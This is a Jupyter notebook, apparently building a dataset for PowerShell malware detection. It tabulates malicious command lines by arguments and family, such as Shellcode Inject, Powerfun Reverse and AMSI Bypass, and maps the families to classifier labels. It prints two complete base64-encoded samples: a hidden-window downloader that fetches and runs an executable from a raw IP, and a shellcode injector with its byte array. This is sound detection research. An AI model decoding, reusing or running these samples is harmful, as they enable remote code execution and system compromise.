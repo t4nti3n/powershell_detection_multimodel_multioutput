{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>Original Code</th>\n",
       "      <th>Filename</th>\n",
       "      <th>Arguments</th>\n",
       "      <th>B64 Decoded</th>\n",
       "      <th>Family Name</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>\\\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1...</td>\n",
       "      <td>001fd68e5a83c14adf9ae5fd02b4219b05f61f6b5d74f1...</td>\n",
       "      <td>['-nop', '-noni', '-enc']</td>\n",
       "      <td>$c = '[DllImport(\"kernel32.dll\")]public static...</td>\n",
       "      <td>Shellcode Inject</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>\\\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1...</td>\n",
       "      <td>006f5f154f95ceb806c508967fd8eec2e106031369b788...</td>\n",
       "      <td>['-window hidden', '-enc']</td>\n",
       "      <td>(New-Object System.Net.WebClient).DownloadFile...</td>\n",
       "      <td>Downloader DFSP</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>\\\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1...</td>\n",
       "      <td>00764435abfb52cfdd3b19ae03e1eaf4e4ab7a05c4a380...</td>\n",
       "      <td>['-enc']</td>\n",
       "      <td>$c = '[DllImport(\"kernel32.dll\")]public static...</td>\n",
       "      <td>Shellcode Inject</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>powershell.exe  -nop -wind hidden -Exec Bypass...</td>\n",
       "      <td>00a34546b6db32ca0d9f2b6aa25012b873da452a0eb939...</td>\n",
       "      <td>['-nop', '-wind hidden', '-Exec Bypass', '-non...</td>\n",
       "      <td>if([IntPtr]::Size -eq 4){$b='powershell.exe'}e...</td>\n",
       "      <td>Powerfun Reverse</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>\\\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1...</td>\n",
       "      <td>00ac03c8ae8994be7809d8a46387bfb784641e9e4c8ce8...</td>\n",
       "      <td>['-window hidden', '-enc']</td>\n",
       "      <td>$1 = '$c = ''[DllImport(\"kernel32.dll\")]public...</td>\n",
       "      <td>Shellcode Inject</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "                                       Original Code  \\\n",
       "0  \\\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1...   \n",
       "1  \\\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1...   \n",
       "2  \\\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1...   \n",
       "3  powershell.exe  -nop -wind hidden -Exec Bypass...   \n",
       "4  \\\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1...   \n",
       "\n",
       "                                            Filename  \\\n",
       "0  001fd68e5a83c14adf9ae5fd02b4219b05f61f6b5d74f1...   \n",
       "1  006f5f154f95ceb806c508967fd8eec2e106031369b788...   \n",
       "2  00764435abfb52cfdd3b19ae03e1eaf4e4ab7a05c4a380...   \n",
       "3  00a34546b6db32ca0d9f2b6aa25012b873da452a0eb939...   \n",
       "4  00ac03c8ae8994be7809d8a46387bfb784641e9e4c8ce8...   \n",
       "\n",
       "                                           Arguments  \\\n",
       "0                          ['-nop', '-noni', '-enc']   \n",
       "1                         ['-window hidden', '-enc']   \n",
       "2                                           ['-enc']   \n",
       "3  ['-nop', '-wind hidden', '-Exec Bypass', '-non...   \n",
       "4                         ['-window hidden', '-enc']   \n",
       "\n",
       "                                         B64 Decoded       Family Name  \n",
       "0  $c = '[DllImport(\"kernel32.dll\")]public static...  Shellcode Inject  \n",
       "1  (New-Object System.Net.WebClient).DownloadFile...   Downloader DFSP  \n",
       "2  $c = '[DllImport(\"kernel32.dll\")]public static...  Shellcode Inject  \n",
       "3  if([IntPtr]::Size -eq 4){$b='powershell.exe'}e...  Powerfun Reverse  \n",
       "4  $1 = '$c = ''[DllImport(\"kernel32.dll\")]public...  Shellcode Inject  "
      ]
     },
     "execution_count": 1,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "import pandas as pd\n",
    "\n",
    "# Read the CSV file\n",
    "df = pd.read_csv('output_dataset.csv')\n",
    "\n",
    "# Display the first few rows of the dataframe\n",
    "df.head()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\\\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\\\"  -window hidden -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQARgBpAGwAZQAoACcAaAB0AHQAcAA6AC8ALwA5ADQALgAxADAAMgAuADUAMwAuADIAMwA4AC8AfgB5AGEAaABvAG8ALwBjAHMAcgBzAHYALgBlAHgAZQAnACwAIgAkAGUAbgB2ADoAQQBQAFAARABBAFQAQQBcAGMAcwByAHMAdgAuAGUAeABlACIAKQA7AFMAdABhAHIAdAAtAFAAcgBvAGMAZQBzAHMAIAAoACIAJABlAG4AdgA6AEEAUABQAEQAQQBUAEEAXABjAHMAcgBzAHYALgBlAHgAZQAiACkA\n"
     ]
    }
   ],
   "source": [
    "print(df.loc[1, 'Original Code'])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "vscode": {
     "languageId": "lua"
    }
   },
   "outputs": [],
   "source": [
    "provided_value = \"\"\\\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\\\"  -nop -noni -enc JABjACAAPQAgACcAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAawBlAHIAbgBlAGwAMwAyAC4AZABsAGwAIgApAF0AcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAGUAeAB0AGUAcgBuACAASQBuAHQAUAB0AHIAIABWAGkAcgB0AHUAYQBsAEEAbABsAG8AYwAoAEkAbgB0AFAAdAByACAAbABwAEEAZABkAHIAZQBzAHMALAAgAHUAaQBuAHQAIABkAHcAUwBpAHoAZQAsACAAdQBpAG4AdAAgAGYAbABBAGwAbABvAGMAYQB0AGkAbwBuAFQAeQBwAGUALAAgAHUAaQBuAHQAIABmAGwAUAByAG8AdABlAGMAdAApADsAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAawBlAHIAbgBlAGwAMwAyAC4AZABsAGwAIgApAF0AcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAGUAeAB0AGUAcgBuACAASQBuAHQAUAB0AHIAIABDAHIAZQBhAHQAZQBUAGgAcgBlAGEAZAAoAEkAbgB0AFAAdAByACAAbABwAFQAaAByAGUAYQBkAEEAdAB0AHIAaQBiAHUAdABlAHMALAAgAHUAaQBuAHQAIABkAHcAUwB0AGEAYwBrAFMAaQB6AGUALAAgAEkAbgB0AFAAdAByACAAbABwAFMAdABhAHIAdABBAGQAZAByAGUAcwBzACwAIABJAG4AdABQAHQAcgAgAGwAcABQAGEAcgBhAG0AZQB0AGUAcgAsACAAdQBpAG4AdAAgAGQAdwBDAHIAZQBhAHQAaQBvAG4ARgBsAGEAZwBzACwAIABJAG4AdABQAHQAcgAgAGwAcABUAGgAcgBlAGEAZABJAGQAKQA7AFsARABsAGwASQBtAHAAbwByAHQAKAAiAG0AcwB2AGMAcgB0AC4AZABsAGwAIgApAF0AcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAGUAeAB0AGUAcgBuACAASQBuAHQAUAB0AHIAIABtAGUAbQBzAGUAdAAoAEkAbgB0AFAAdAByACAAZABlAHMAdAAsACAAdQBpAG4AdAAgAHMAcgBjACwAIAB1AGkAbgB0ACAAYwBvAHUAbgB0ACkAOwAnADsAJAB3ACAAPQAgAEEAZABkAC0AVAB5AHAAZQAgAC0AbQBlAG0AYgBlAHIARABlAGYAaQBuAGkAdABpAG8AbgAgACQAYwAgAC0ATgBhAG0AZQAgACIAVwBpAG4AMwAyACIAIAAtAG4AYQBtAGUAcwBwAGEAYwBlACAAVwBpAG4AMwAyAEYAdQBuAGMAdABpAG8AbgBzACAALQBwAGEAcwBzAHQAaAByAHUAOwBbAEIAeQB0AGUAWwBdAF0AOwBbAEIAeQB0AGUAWwBdAF0AJAB6ACAAPQAgADAAeABmAGMALAAwAHgAZQA4ACwAMAB4ADgAMgAsADAAeAAwADAALAAwAHgAMAAwACwAMAB4ADAAMAAsADAAeAA2ADAALAAwAHgAOAA5ACwAMAB4AGUANQAsADAAeAAzADEALAAwAHgAYwAwACwAMAB4ADYANAAsADAAeAA4AGIALAAwAHgANQAwACwAMAB4ADMAMAAsADAAeAA4AGIALAAwAHgANQAyACwAMAB4ADAAYwAsADAAeAA4AGIALAAwAHgANQAyACwAMAB4ADEANAAsADAAeAA4AGIALAAwAHgANwAyACwAMAB4ADIAOAAsADAAeAAwAGYALAAwAHgAYgA3ACwAMAB4ADQAYQAsADAAeAAyADYALAAwAHgAMwAxACwAMAB4AGYAZgAsADAAeABhAGMALAAwAHgAMwBjACwAMAB4ADYAMQAsADAAeAA3AGMALAAwAHgAMAAyACwAMAB4ADIAYwAsADAAeAAyADAALAAwAHgAYwAxACwAMAB4AGMAZgAsADAAeAAwAGQALAAwAHgAMAAxACwAMAB4AGMANwAsADAAeABlADIALAAwAHgAZgAyACwAMAB4ADUAMgAsADAAeAA1ADcALAAwAHgAOABiACwAMAB4ADUAMgAsADAAeAAxADAALAAwAHgAOABiACwAMAB4ADQAYQAsADAAeAAzAGMALAAwAHgAOABiACwAMAB4ADQAYwAsADAAeAAxADEALAAwAHgANwA4ACwAMAB4AGUAMwAsADAAeAA0ADgALAAwAHgAMAAxACwAMAB4AGQAMQAsADAAeAA1ADEALAAwAHgAOABiACwAMAB4ADUAOQAsADAAeAAyADAALAAwAHgAMAAxACwAMAB4AGQAMwAsADAAeAA4AGIALAAwAHgANAA5ACwAMAB4ADEAOAAsADAAeABlADMALAAwAHgAMwBhACwAMAB4ADQAOQAsADAAeAA4AGIALAAwAHgAMwA0ACwAMAB4ADgAYgAsADAAeAAwADEALAAwAHgAZAA2ACwAMAB4ADMAMQAsADAAeABmAGYALAAwAHgAYQBjACwAMAB4AGMAMQAsADAAeABjAGYALAAwAHgAMABkACwAMAB4ADAAMQAsADAAeABjADcALAAwAHgAMwA4ACwAMAB4AGUAMAAsADAAeAA3ADUALAAwAHgAZgA2ACwAMAB4ADAAMwAsADAAeAA3AGQALAAwAHgAZgA4ACwAMAB4ADMAYgAsADAAeAA3AGQALAAwAHgAMgA0ACwAMAB4ADcANQAsADAAeABlADQALAAwAHgANQA4ACwAMAB4ADgAYgAsADAAeAA1ADgALAAwAHgAMgA0ACwAMAB4ADAAMQAsADAAeABkADMALAAwAHgANgA2ACwAMAB4ADgAYgAsADAAeAAwAGMALAAwAHgANABiACwAMAB4ADgAYgAsADAAeAA1ADgALAAwAHgAMQBjACwAMAB4ADAAMQAsADAAeABkADMALAAwAHgAOABiACwAMAB4ADAANAAsADAAeAA4AGIALAAwAHgAMAAxACwAMAB4AGQAMAAsADAAeAA4ADkALAAwAHgANAA0ACwAMAB4ADIANAAsADAAeAAyADQALAAwAHgANQBiACwAMAB4ADUAYgAsADAAeAA2ADEALAAwAHgANQA5ACwAMAB4ADUAYQAsADAAeAA1ADEALAAwAHgAZgBmACwAMAB4AGUAMAAsADAAeAA1AGYALAAwAHgANQBmACwAMAB4ADUAYQAsADAAeAA4AGIALAAwAHgAMQAyACwAMAB4AGUAYgAsADAAeAA4AGQALAAwAHgANQBkACwAMAB4ADYAOAAsADAAeAAzADMALAAwAHgAMwAyACwAMAB4ADAAMAAsADAAeAAwADAALAAwAHgANgA4ACwAMAB4ADcANwAsADAAeAA3ADMALAAwAHgAMwAyACwAMAB4ADUAZgAsADAAeAA1ADQALAAwAHgANgA4ACwAMAB4ADQAYwAsADAAeAA3ADcALAAwAHgAMgA2ACwAMAB4ADAANwAsADAAeABmAGYALAAwAHgAZAA1ACwAMAB4AGIAOAAsADAAeAA5ADAALAAwAHgAMAAxACwAMAB4ADAAMAAsADAAeAAwADAALAAwAHgAMgA5ACwAMAB4AGMANAAsADAAeAA1ADQALAAwAHgANQAwACwAMAB4ADYAOAAsADAAeAAyADkALAAwAHgAOAAwACwAMAB4ADYAYgAsADAAeAAwADAALAAwAHgAZgBmACwAMAB4AGQANQAsADAAeAA2AGEALAAwAHgAMAA1ACwAMAB4ADYAOAAsADAAeAAzADEALAAwAHgAMwAxACwAMAB4AGMANQAsADAAeAA1ADgALAAwAHgANgA4ACwAMAB4ADAAMgAsADAAeAAwADAALAAwAHgAMAAxACwAMAB4AGIAYgAsADAAeAA4ADkALAAwAHgAZQA2ACwAMAB4ADUAMAAsADAAeAA1ADAALAAwAHgANQAwACwAMAB4ADUAMAAsADAAeAA0ADAALAAwAHgANQAwACwAMAB4ADQAMAAsADAAeAA1ADAALAAwAHgANgA4ACwAMAB4AGUAYQAsADAAeAAwAGYALAAwAHgAZABmACwAMAB4AGUAMAAsADAAeABmAGYALAAwAHgAZAA1ACwAMAB4ADkANwAsADAAeAA2AGEALAAwAHgAMQAwACwAMAB4ADUANgAsADAAeAA1ADcALAAwAHgANgA4ACwAMAB4ADkAOQAsADAAeABhADUALAAwAHgANwA0ACwAMAB4ADYAMQAsADAAeABmAGYALAAwAHgAZAA1ACwAMAB4ADgANQAsADAAeABjADAALAAwAHgANwA0ACwAMAB4ADAAYQAsADAAeABmAGYALAAwAHgANABlACwAMAB4ADAAOAAsADAAeAA3ADUALAAwAHgAZQBjACwAMAB4AGUAOAAsADAAeAA2ADEALAAwAHgAMAAwACwAMAB4ADAAMAAsADAAeAAwADAALAAwAHgANgBhACwAMAB4ADAAMAAsADAAeAA2AGEALAAwAHgAMAA0ACwAMAB4ADUANgAsADAAeAA1ADcALAAwAHgANgA4ACwAMAB4ADAAMgAsADAAeABkADkALAAwAHgAYwA4ACwAMAB4ADUAZgAsADAAeABmAGYALAAwAHgAZAA1ACwAMAB4ADgAMwAsADAAeABmADgALAAwAHgAMAAwACwAMAB4ADcAZQAsADAAeAAzADYALAAwAHgAOABiACwAMAB4ADMANgAsADAAeAA2AGEALAAwAHgANAAwACwAMAB4ADYAOAAsADAAeAAwADAALAAwAHgAMQAwACwAMAB4ADAAMAAsADAAeAAwADAALAAwAHgANQA2ACwAMAB4ADYAYQAsADAAeAAwADAALAAwAHgANgA4ACwAMAB4ADUAOAAsADAAeABhADQALAAwAHgANQAzACwAMAB4AGUANQAsADAAeABmAGYALAAwAHgAZAA1ACwAMAB4ADkAMwAsADAAeAA1ADMALAAwAHgANgBhACwAMAB4ADAAMAAsADAAeAA1ADYALAAwAHgANQAzACwAMAB4ADUANwAsADAAeAA2ADgALAAwAHgAMAAyACwAMAB4AGQAOQAsADAAeABjADgALAAwAHgANQBmACwAMAB4AGYAZgAsADAAeABkADUALAAwAHgAOAAzACwAMAB4AGYAOAAsADAAeAAwADAALAAwAHgANwBkACwAMAB4ADIAMgAsADAAeAA1ADgALAAwAHgANgA4ACwAMAB4ADAAMAAsADAAeAA0ADAALAAwAHgAMAAwACwAMAB4ADAAMAAsADAAeAA2AGEALAAwAHgAMAAwACwAMAB4ADUAMAAsADAAeAA2ADgALAAwAHgAMABiACwAMAB4ADIAZgAsADAAeAAwAGYALAAwAHgAMwAwACwAMAB4AGYAZgAsADAAeABkADUALAAwAHgANQA3ACwAMAB4ADYAOAAsADAAeAA3ADUALAAwAHgANgBlACwAMAB4ADQAZAAsADAAeAA2ADEALAAwAHgAZgBmACwAMAB4AGQANQAsADAAeAA1AGUALAAwAHgANQBlACwAMAB4AGYAZgAsADAAeAAwAGMALAAwAHgAMgA0ACwAMAB4AGUAOQAsADAAeAA3ADEALAAwAHgAZgBmACwAMAB4AGYAZgAsADAAeABmAGYALAAwAHgAMAAxACwAMAB4AGMAMwAsADAAeAAyADkALAAwAHgAYwA2ACwAMAB4ADcANQAsADAAeABjADcALAAwAHgAYwAzACwAMAB4AGIAYgAsADAAeABmADAALAAwAHgAYgA1ACwAMAB4AGEAMgAsADAAeAA1ADYALAAwAHgANgBhACwAMAB4ADAAMAAsADAAeAA1ADMALAAwAHgAZgBmACwAMAB4AGQANQA7ACQAZwAgAD0AIAAwAHgAMQAwADAAMAA7AGkAZgAgACgAJAB6AC4ATABlAG4AZwB0AGgAIAAtAGcAdAAgADAAeAAxADAAMAAwACkAewAkAGcAIAA9ACAAJAB6AC4ATABlAG4AZwB0AGgAfQA7ACQAeAA9ACQAdwA6ADoAVgBpAHIAdAB1AGEAbABBAGwAbABvAGMAKAAwACwAMAB4ADEAMAAwADAALAAkAGcALAAwAHgANAAwACkAOwBmAG8AcgAgACgAJABpAD0AMAA7ACQAaQAgAC0AbABlACAAKAAkAHoALgBMAGUAbgBnAHQAaAAtADEAKQA7ACQAaQArACsAKQAgAHsAJAB3ADoAOgBtAGUAbQBzAGUAdAAoAFsASQBuAHQAUAB0AHIAXQAoACQAeAAuAFQAbwBJAG4AdAAzADIAKAApACsAJABpACkALAAgACQAegBbACQAaQBdACwAIAAxACkAfQA7ACQAdwA6ADoAQwByAGUAYQB0AGUAVABoAHIAZQBhAGQAKAAwACwAMAAsACQAeAAsADAALAAwACwAMAApADsAZgBvAHIAIAAoADsAOwApAHsAUwB0AGEAcgB0AC0AcwBsAGUAZQBwACAANgAwAH0AOwA=\",\n",
    "\"\n",
    "is_match = df.loc[1, 'Original Code'] == provided_value\n",
    "print(is_match)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "                                     Arguments  Count\n",
      "0                                     ['-Enc']      5\n",
      "1                          ['-EncodedCommand']    136\n",
      "2              ['-Exe ByPass', '-Nol', '-Enc']      2\n",
      "3             ['-Exec ByPass', '-Nol', '-Enc']      6\n",
      "4             ['-Exec Bypass', '-NoL', '-Enc']      5\n",
      "..                                         ...    ...\n",
      "69       ['-w hidden', '-nop', '-nol', '-Enc']      1\n",
      "70                     ['-win hidden', '-enc']      1\n",
      "71       ['-window hidden', '-EncodedCommand']      7\n",
      "72                  ['-window hidden', '-enc']   1145\n",
      "73  ['-windowstyle hidden', '-encodedCommand']      1\n",
      "\n",
      "[74 rows x 2 columns]\n"
     ]
    }
   ],
   "source": [
    "# Group by the 'Arguments' column and count the occurrences\n",
    "arguments_info = df.groupby('Arguments').size().reset_index(name='Count')\n",
    "\n",
    "# Display the table\n",
    "print(arguments_info)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "['Shellcode Inject' 'Downloader DFSP' 'Powerfun Reverse' 'SET'\n",
      " 'Downloader DFSP 2X' 'Unicorn' 'PowerShell Empire' 'Downloader Proxy'\n",
      " 'Meterpreter RHTTP' 'Scheduled Task COM' 'Downloader IEXDS' 'Unknown'\n",
      " 'AMSI Bypass' 'VB Task' 'Veil Stream' 'PowerWorm' 'Remote DLL'\n",
      " 'Downloader Kraken' 'TXT C2' 'BITSTransfer' 'Downloader DFSP DPL'\n",
      " 'Powerfun Bind' 'Unicorn Modified' 'PowerSploit GTS' 'DynAmite Launcher'\n",
      " 'Remove AV']\n"
     ]
    }
   ],
   "source": [
    "unique_family_names = df['Family Name'].unique()\n",
    "print(unique_family_names)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "26\n"
     ]
    }
   ],
   "source": [
    "total_unique_family_names = df['Family Name'].nunique()\n",
    "print(total_unique_family_names)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "def label_family_name(family_name):\n",
    "    if family_name == \"AMSI Bypass\":\n",
    "        return \"bypass\"\n",
    "    elif family_name in [\"Downloader DFSP\", \"Downloader DFSP 2X\", \"Downloader Proxy\", \"Downloader IEXDS\", \"Downloader Kraken\", \"Downloader DFSP DPL\", \"BITSTransfer\"]:\n",
    "        return \"Downloader\"\n",
    "    elif family_name in [\"Shellcode Inject\", \"Remote DLL\", \"Unicorn\", \"Unicorn Modified\", \"Meterpreter RHTTP\"]:\n",
    "        return \"Injector\"\n",
    "    elif family_name in [\"PowerShell Empire\", \"PowerSploit GTS\", \"Powerfun Reverse\", \"Powerfun Bind\", \"PowerWorm\", \"DynAmite Launcher\", \"Veil Stream\"]:\n",
    "        return \"payload\"\n",
    "    elif family_name in [\"Scheduled Task COM\", \"VB Task\", \"TXT C2\", \"SET\", \"Remove AV\"]:\n",
    "        return \"TaskExecution\"\n",
    "    else:\n",
    "        return \"unknown\"\n",
    "\n",
    "df['label'] = df['Family Name'].apply(label_family_name)\n",
    "print(df[['Family Name', 'label']].head())"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".venv",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.12.6"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
